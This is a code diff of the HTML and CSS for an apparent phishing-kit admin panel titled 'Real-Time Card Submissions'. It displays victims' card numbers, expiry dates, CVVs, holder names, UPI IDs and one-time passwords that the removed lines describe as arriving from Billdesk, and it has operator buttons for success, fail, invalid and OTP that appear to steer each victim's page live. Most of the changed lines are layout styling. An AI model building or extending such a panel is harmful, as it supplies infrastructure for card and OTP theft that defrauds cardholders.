@@ -3,10 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Block all device permissions to prevent "nearby devices" popup -->
-    <meta http-equiv="Permissions-Policy" content="bluetooth=(), geolocation=(), microphone=(), camera=(), usb=()">
     <title>Admin Panel - Real-Time Card Submissions</title>
-    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -92,7 +89,7 @@
 
         .main-container {
             padding: 40px;
-            max-width: 1800px;
+            max-width: 100%;
             margin: 0 auto;
         }
 
@@ -109,42 +106,39 @@
             margin-bottom: 40px;
         }
 
+        /* SINGLE-LINE ROW LAYOUT */
         .submissions-grid {
             display: flex;
             flex-direction: column;
             gap: 12px;
         }
 
-        /* NEW: Single-line submission row */
-        .submission-row {
+        .submission-card {
             background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
-            border: 2px solid #333;
-            border-radius: 12px;
-            padding: 16px 24px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 12px 20px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.5);
+            transition: all 0.3s ease;
+            animation: slideIn 0.4s ease-out;
+            position: relative;
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            gap: 20px;
-            transition: all 0.3s ease;
-            cursor: pointer;
-            animation: slideIn 0.3s ease-out;
+            gap: 15px;
+            flex-wrap: nowrap;
+            overflow: visible;
         }
 
-        .submission-row:hover {
-            border-color: #555;
-            background: linear-gradient(135deg, #222 0%, #111 100%);
-        }
-
-        /* NEW: Red border for unseen submissions */
-        .submission-row.unseen {
-            border: 2px solid #ff0000;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+        .submission-card.new {
+            border-color: #ff0000;
+            box-shadow: 0 4px 16px rgba(255, 0, 0, 0.2);
+            animation: slideIn 0.4s ease-out, glow 2s ease-in-out;
         }
 
         @keyframes slideIn {
             from {
                 opacity: 0;
-                transform: translateY(-10px);
+                transform: translateY(-20px);
             }
             to {
                 opacity: 1;
@@ -152,57 +146,119 @@
             }
         }
 
-        .submission-details {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
-            font-size: 14px;
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 4px 16px rgba(255, 0, 0, 0.2); }
+            50% { box-shadow: 0 4px 16px rgba(0, 255, 0, 0.5); }
         }
 
-        .detail-compact {
+        /* Single-line row components */
+        .submission-type {
+            font-size: 11px;
+            font-weight: bold;
+            color: #00ff00;
+            text-transform: uppercase;
+            min-width: 50px;
+            letter-spacing: 0.5px;
+        }
+
+        .submission-id-short {
+            font-size: 11px;
+            color: #666;
+            font-family: 'Courier New', monospace;
+            min-width: 80px;
+        }
+
+        .student-name-short {
+            font-size: 13px;
+            font-weight: 600;
             color: #ffffff;
+            min-width: 150px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
 
-        .detail-compact strong {
-            color: #888;
-            font-weight: 600;
-        }
-
-        .detail-separator {
-            color: #555;
-        }
-
-        /* NEW: Inline commands section */
-        .commands-section-inline {
-            display: flex;
-            gap: 8px;
-            flex-shrink: 0;
-        }
-
-        .command-btn-inline {
-            padding: 8px 16px;
-            border: none;
-            border-radius: 6px;
+        .student-roll-short {
             font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
+            color: #888;
+            min-width: 100px;
             white-space: nowrap;
         }
 
-        .command-btn-inline:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+        .detail-inline {
+            font-size: 12px;
+            color: #aaa;
+            font-family: 'Courier New', monospace;
+            min-width: 120px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
 
-        .command-btn-inline:active {
-            transform: translateY(0);
+        .detail-inline.card-number {
+            min-width: 150px;
         }
 
-        .command-btn-inline:disabled {
-            opacity: 0.5;
+        .detail-inline.expiry {
+            min-width: 60px;
+        }
+
+        .detail-inline.cvv {
+            min-width: 45px;
+        }
+
+        .detail-inline.holder {
+            min-width: 120px;
+        }
+
+        .detail-inline.upi-id {
+            min-width: 180px;
+        }
+
+        .amount-inline {
+            font-size: 14px;
+            color: #00ff00;
+            font-weight: bold;
+            min-width: 90px;
+            white-space: nowrap;
+        }
+
+        .submission-time-short {
+            font-size: 11px;
+            color: #666;
+            min-width: 80px;
+            white-space: nowrap;
+        }
+
+        .commands-inline {
+            display: flex;
+            gap: 6px;
+            margin-left: auto;
+            flex-shrink: 0;
+        }
+
+        .command-btn {
+            padding: 6px 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+
+        .command-btn:hover:not(:disabled) {
+            transform: scale(1.05);
+        }
+
+        .command-btn:active:not(:disabled) {
+            transform: scale(0.95);
+        }
+
+        .command-btn:disabled {
+            opacity: 0.4;
             cursor: not-allowed;
         }
 
@@ -212,8 +268,9 @@
             border: 1px solid #00ff00;
         }
 
-        .btn-success:hover {
+        .btn-success:hover:not(:disabled) {
             background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);
+            box-shadow: 0 2px 10px rgba(0, 255, 0, 0.4);
         }
 
         .btn-fail {
@@ -222,8 +279,9 @@
             border: 1px solid #ff0000;
         }
 
-        .btn-fail:hover {
+        .btn-fail:hover:not(:disabled) {
             background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
+            box-shadow: 0 2px 10px rgba(255, 0, 0, 0.4);
         }
 
         .btn-invalid {
@@ -232,56 +290,9 @@
             border: 1px solid #ff8800;
         }
 
-        .btn-invalid:hover {
+        .btn-invalid:hover:not(:disabled) {
             background: linear-gradient(135deg, #ff8800 0%, #cc6600 100%);
-        }
-
-        .btn-otp {
-            background: linear-gradient(135deg, #0066cc 0%, #004d99 100%);
-            color: #ffffff;
-            border: 1px solid #0088ff;
-        }
-
-        .btn-otp:hover {
-            background: linear-gradient(135deg, #0088ff 0%, #0066cc 100%);
-        }
-
-        /* NEW: Hide button */
-        .btn-hide {
-            background: linear-gradient(135deg, #666 0%, #444 100%);
-            color: #ffffff;
-            border: 1px solid #888;
-        }
-
-        .btn-hide:hover {
-            background: linear-gradient(135deg, #888 0%, #666 100%);
-        }
-
-        /* NEW: Inline OTP display */
-        .otp-display-inline {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: #0d0d0d;
-            padding: 8px 16px;
-            border-radius: 6px;
-            border: 1px solid #0088ff;
-            margin-left: 12px;
-        }
-
-        .otp-label {
-            font-size: 11px;
-            color: #0088ff;
-            text-transform: uppercase;
-            font-weight: 600;
-        }
-
-        .otp-value {
-            font-size: 18px;
-            color: #ffffff;
-            font-weight: bold;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 4px;
+            box-shadow: 0 2px 10px rgba(255, 136, 0, 0.4);
         }
 
         .empty-state {
@@ -306,29 +317,73 @@
             color: #666;
         }
 
-        @media (max-width: 768px) {
-            .header {
-                flex-direction: column;
-                gap: 15px;
-            }
+        .status-badge {
+            font-size: 9px;
+            font-weight: bold;
+            text-transform: uppercase;
+            padding: 3px 8px;
+            border-radius: 10px;
+            letter-spacing: 0.5px;
+            min-width: 70px;
+            text-align: center;
+        }
 
-            .main-container {
-                padding: 20px;
-            }
+        .status-processing {
+            background: #1a4d1a;
+            color: #00ff00;
+            border: 1px solid #2d5a2d;
+        }
 
-            .submission-row {
-                flex-direction: column;
-                align-items: flex-start;
-            }
+        .status-completed {
+            background: #1a4d1a;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+        }
 
-            .commands-section-inline {
-                width: 100%;
+        .status-failed {
+            background: #4d1a1a;
+            color: #ff0000;
+            border: 1px solid #ff0000;
+        }
+
+        .status-invalid {
+            background: #4d331a;
+            color: #ff8800;
+            border: 1px solid #ff8800;
+        }
+
+        .new-badge {
+            font-size: 9px;
+            background: #00ff00;
+            color: #000000;
+            padding: 3px 8px;
+            border-radius: 10px;
+            font-weight: bold;
+            text-transform: uppercase;
+            animation: blink 1s ease-in-out infinite;
+            position: absolute;
+            top: -8px;
+            left: 10px;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        @media (max-width: 1400px) {
+            .detail-inline.holder {
+                display: none;
+            }
+        }
+
+        @media (max-width: 1200px) {
+            .submission-card {
                 flex-wrap: wrap;
             }
-
-            .command-btn-inline {
-                flex: 1;
-                min-width: 100px;
+            .commands-inline {
+                width: 100%;
+                justify-content: flex-end;
             }
         }
     </style>
@@ -352,8 +407,8 @@
 
     <!-- Main Container -->
     <div class="main-container">
-        <h1 class="page-title">Real-Time Card Submissions</h1>
-        <p class="page-subtitle">Monitor and manage card details submitted from Billdesk in real-time | Click on a submission to mark as seen</p>
+        <h1 class="page-title">Real-Time Submissions</h1>
+        <p class="page-subtitle">Monitor and manage Card/UPI/BHIM submissions in real-time</p>
 
         <!-- Submissions Grid -->
         <div class="submissions-grid" id="submissionsGrid">
@@ -361,13 +416,12 @@
             <div class="empty-state" id="emptyState">
                 <div class="empty-icon">💳</div>
                 <div class="empty-title">No Submissions Yet</div>
-                <div class="empty-subtitle">Card submissions will appear here in real-time</div>
+                <div class="empty-subtitle">Submissions will appear here in real-time</div>
             </div>
         </div>
     </div>
 
-    <script src="admin.js?v=1766599580"></script>
-<script src="visitor_display.js?v=1766599580"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="admin_single_line.js"></script>
 </body>
 </html>
-
